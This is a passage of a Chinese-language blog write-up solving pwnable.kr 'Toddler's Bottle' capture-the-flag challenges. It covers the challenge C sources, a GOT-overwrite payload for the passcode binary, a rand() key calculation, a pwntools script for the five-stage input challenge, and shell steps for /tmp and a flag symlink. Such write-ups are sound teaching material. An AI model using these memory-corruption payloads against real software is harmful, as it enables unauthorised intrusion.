class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    welcome();</span><br><span class="line">    login();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// something after login...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题还是一个栈溢出，不过是基于栈重叠的溢出。程序先后调用了 welcome 和 login 两个函数，在 welcome 函数中有一个 100 字节的 buf，scanf 中也没有任何溢出，而执行完 welcome 以后紧接着就执行 login 函数，在 login 函数中我们需要改变两个局部变量 passcode1 和 passcode2 的值才能拿到 flag。</p><p>需要注意的是，当一个函数执行完毕后，并不会将该函数栈上的数据清空，仅改变 esp 和 ebp 的值，所以在执行完 welcome 以后，继续执行 login 的时候，我们在 welcome 中输入的 buf 中 100 个字节还保存在栈上，只不过这时候的栈帧已经变成了 login 的栈帧，也就是说：我们对 welcome 函数中 buf 的修改，是有可能影响到 login 函数中局部变量的值，我们来实验一下。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/7.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/8.png"></p><p>可以看到，在 welcome 中对 buf 从 0xff940298 一直到 0xff9402fc，而在 login 中，passcode1 的的地址为 esp+4 即 0xff9402e4，小于 0xff9402fc，接着 scanf 输入到 passcode1 的时候我们就可以向任意地址写一个数字（scanf 的参数是 %d），不过可惜的是 buf 影响不到 passcode2，还是需要想办法绕过 <code>passcode1==338150 &amp;&amp; passcode2==13371337</code> 的判断。</p><p>既然可以修改任意地址到值为一个数字，那么我们就可以通过修改 got 表实现任意地址到跳转，在第一次 scanf 以后就有一个 fflush 函数，这是一个 libc 的函数，因此可以修改 fflush 的 got 表劫持控制流直接绕过 if 判断跳转到执行 system 的地址，即 0x80485d7，但是 scanf 只接受一个数字，因此就需要将 0x80485d7 以 int 的形式输入即可。最后在 bash 中执行如下 payload。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print(&#x27;a&#x27;*96+&#x27;\x04\xa0\x04\x08&#x27;+&#x27;134514135&#x27;)&quot;</span>|./passcode</span><br></pre></td></tr></table></figure><h1 id="random-1-pt"><a href="#random-1-pt" class="headerlink" title="random (1 pt)"></a>random (1 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> random;</span><br><span class="line">    random = rand();    <span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很经典的 random 伪随机数，由于没有用 srand 设置随机数种子，默认会使用 1 作为种子，因此只需要在程序运行的时候用 gdb 看一下 rand 函数返回的第一个数字即可，为 0x6b8b4567，和 0xdeadbeef 异或一下就得到最后的结果 3039230856。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/9.png"></p><h1 id="input-4-pt"><a href="#input-4-pt" class="headerlink" title="input (4 pt)"></a>input (4 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// argv</span></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// stdio</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// env</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// file</span></span><br><span class="line">    FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// network</span></span><br><span class="line">    <span class="type">int</span> sd, cd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">    sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    saddr.sin_port = htons(atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line">    <span class="keyword">if</span>(bind(sd, (<span class="keyword">struct</span> sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    listen(sd, <span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> c = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">    cd = accept(sd, (<span class="keyword">struct</span> sockaddr *)&amp;caddr, (<span class="type">socklen_t</span>*)&amp;c);</span><br><span class="line">    <span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here&#x27;s your flag</span></span><br><span class="line">    system(<span class="string">&quot;/bin/cat flag&quot;</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>非常麻烦的一个题，要拿到 flag 一共需要过 5 关，分别都和程序的输入输出有关，但是都可以用 pwntools 解决。第一关首先需要有 100 个 argv，第一个 argv 是程序本身的路径，之后需要跟 99 个命令行参数，并且 argv[65]和 argv[66]分别为 <code>\x00</code> 和<code>\x20\x0a\x0d</code>，很简单，直接用 pwntools 启动程序的 process 函数的 argv 参数传递即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;/home/input2/input&quot;</span>)</span><br><span class="line">a = [elf.path] + [<span class="string">&#x27;a&#x27;</span>] * <span class="number">99</span></span><br><span class="line">a[<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)] = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">a[<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)] = <span class="string">&#x27;\x20\x0a\x0d&#x27;</span></span><br><span class="line">a[<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)] = <span class="string">&#x27;7373&#x27;</span></span><br><span class="line">conn = process(argv=a)</span><br></pre></td></tr></table></figure><p>第二关程序会从标准输入和标准错误中读取，并且比较读到的是不是 <code>\x00\x0a\x00\xff</code> 和<code>\x00\x0a\x02\xff</code>，pwntools 的 process 直接提供了 stdin 和 stdout 的读写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conn.sendafter(<span class="string">&#x27;Stage 1 clear!\n&#x27;</span>, <span class="string">&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">conn.stderr.write(<span class="string">&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br></pre></td></tr></table></figure><p>第三关程序会从环境变量 <code>\xde\xad\xbe\xef</code> 中读取，比较是否是<code>\xca\xfe\xba\xbe</code>，直接用 process 函数的 env 参数传递就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">env = &#123;<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>: <span class="string">&#x27;\xca\xfe\xba\xbe&#x27;</span>&#125;</span><br><span class="line">conn = process(env=env)</span><br></pre></td></tr></table></figure><p>第四关有点特殊，需要创建一个文件名为 <code>\x0a</code> 的文件，并且文件内容为<code>\x00\x00\x00\x00</code>，但是题目环境目录是不可写的，不过我们可以用其他方法绕过，后面再说，先用 python 创建这个文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;\x0a&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后一关是 socket 读写，通过 argv[67]提供一个端口，向这个端口发送<code>\xde\xad\xbe\xef</code>，pwntools 也可以直接做到。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">7373</span>)</span><br><span class="line">r.send(<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样 5 关就都过了，最后的 exp 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;/home/input2/input&quot;</span>)</span><br><span class="line"></span><br><span class="line">a = [elf.path] + [<span class="string">&#x27;a&#x27;</span>] * <span class="number">99</span></span><br><span class="line">a[<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)] = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">a[<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)] = <span class="string">&#x27;\x20\x0a\x0d&#x27;</span></span><br><span class="line">a[<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)] = <span class="string">&#x27;7373&#x27;</span></span><br><span class="line"></span><br><span class="line">env = &#123;<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>: <span class="string">&#x27;\xca\xfe\xba\xbe&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;\x0a&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn = process(env=env, argv=a)</span><br><span class="line">conn.sendafter(<span class="string">&#x27;Stage 1 clear!\n&#x27;</span>, <span class="string">&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">conn.stderr.write(<span class="string">&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br><span class="line">conn.recvuntil(<span class="string">&#x27;Stage 4 clear!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">7373</span>)</span><br><span class="line">r.send(<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;Stage 5 clear!\n&#x27;</span>)</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们还有第四关的问题没有解决，就是题目环境下的目录是不可写的，而我们又需要创建文件并且可以读写该文件。tmp 目录通常都是自由的，我们可以任意读写 tmp 目录，但是在题目下我们读取不了 tmp 目录下的文件，但是可以在 tmp 目录下创建目录，我们所创建的这个目录具有完全的读写权限，在这个目录下运行 exp 就没有问题了。</p><p>其实还有最后一个问题，五关都过了一个，程序是通过相对路径读取的 flag，但是在 tmp 目录下我们并没有 flag，不过我们可以通过软链接的方式将 home 下的 flag 链接到我们创建的目录即可，最终我们需要在 bash 下依次执行如下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /tmp/not_exist</span><br><span class="line"><span class="built_in">cd</span> /tmp/not_exist</span><br><span class="line"><span class="built_in">ln</span> -s /home/input2/flag .</span><br><span class="line"><span class="comment"># using scp to copy you exp to here</span></span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure><h1 id="leg-2-pt"><a href="#leg-2-pt" class="headerlink" title="leg (2 pt)"></a>leg (2 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">key1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov r3, pc\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">key2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;push    &#123;r6&#125;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;add    r6, pc, $1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;bx    r6\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.code   16\n&quot;</span></span><br><span class="line">    <span class="string">&quot;mov    r3, pc\n&quot;</span></span><br><span class="line">    <span class="string">&quot;add    r3, $0x4\n&quot;</span></span><br><span class="line">    <span class="string">&quot;push    &#123;r3&#125;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pop    &#123;pc&#125;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.code    32\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pop    &#123;r6&#125;\n&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">key3</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov r3, lr\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Daddy has very strong arm! : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line">    <span class="keyword">if</span>((key1()+key2()+key3()) == key )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratz!\n&quot;</span>);</span><br><span class="line">        <span class="type">int</span> fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="type">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">        write(<span class="number">0</span>, buf, r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I have strong leg :P\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要我们输入一个数字，这个数字为 3 个函数 key1，key2 和 key3 的返回值的和。这 3 个函数都是直接用 arm 汇编写的，题目也直接给了这几个函数的反汇编源码，那么直接看汇编代码就可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008d3c &lt;+0&gt;:    push    &#123;r4, r11, lr&#125;</span><br><span class="line">   0x00008d40 &lt;+4&gt;:    add    r11, sp, #8</span><br><span class="line">   0x00008d44 &lt;+8&gt;:    sub    sp, sp, #12</span><br><span class="line">   0x00008d48 &lt;+12&gt;:    mov    r3, #0</span><br><span class="line">   0x00008d4c &lt;+16&gt;:    str    r3, [r11, #-16]</span><br><span class="line">   0x00008d50 &lt;+20&gt;:    ldr    r0, [pc, #104]    ; 0x8dc0 &lt;main+132&gt;</span><br><span class="line">   0x00008d54 &lt;+24&gt;:    bl    0xfb6c &lt;printf&gt;</span><br><span class="line">   0x00008d58 &lt;+28&gt;:    sub    r3, r11, #16</span><br><span class="line">   0x00008d5c &lt;+32&gt;:    ldr    r0, [pc, #96]    ; 0x8dc4 &lt;main+136&gt;</span><br><span class="line">   0x00008d60 &lt;+36&gt;:    mov    r1, r3</span><br><span class="line">   0x00008d64 &lt;+40&gt;:    bl    0xfbd8 &lt;__isoc99_scanf&gt;</span><br><span class="line">   0x00008d68 &lt;+44&gt;:    bl    0x8cd4 &lt;key1&gt;</span><br><span class="line">   0x00008d6c &lt;+48&gt;:    mov    r4, r0</span><br><span class="line">   0x00008d70 &lt;+52&gt;:    bl    0x8cf0 &lt;key2&gt;</span><br><span class="line">   0x00008d74 &lt;+56&gt;:    mov    r3, r0</span><br><span class="line">   0x00008d78 &lt;+60&gt;:    add    r4, r4, r3</span><br><span class="line">   0x00008d7c &lt;+64&gt;:    bl    0x8d20 &lt;key3&gt;</span><br><span class="line">   0x00008d80 &lt;+68&gt;:    mov    r3, r0</span><br><span class="line">   0x00008d84 &lt;+72&gt;:    add    r2, 